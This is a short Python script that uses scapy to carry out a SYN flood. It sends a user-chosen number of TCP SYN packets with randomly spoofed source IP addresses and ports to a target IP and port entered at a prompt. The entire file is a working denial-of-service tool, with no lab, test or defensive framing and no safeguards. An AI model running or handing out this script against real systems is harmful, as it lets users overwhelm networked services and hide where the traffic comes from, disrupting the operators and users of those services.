from scapy.all import *
import random

def syn_flood(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        # Generate a random source IP address
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        # Generate a random source port number
        src_port = random.randint(1024, 65535)
        
        # Create the IP header
        ip = IP(src=src_ip, dst=target_ip)
        # Create the TCP SYN packet
        tcp = TCP(sport=src_port, dport=target_port, flags="S")
        
        # Combine the IP and TCP headers to form the packet
        packet = ip / tcp
        
        # Send the packet
        send(packet, verbose=False)
        
        print(f"Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")

if __name__ == "__main__":
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port: "))
    packet_count = int(input("Enter number of packets to send: "))
    
    syn_flood(target_ip, target_port, packet_count)
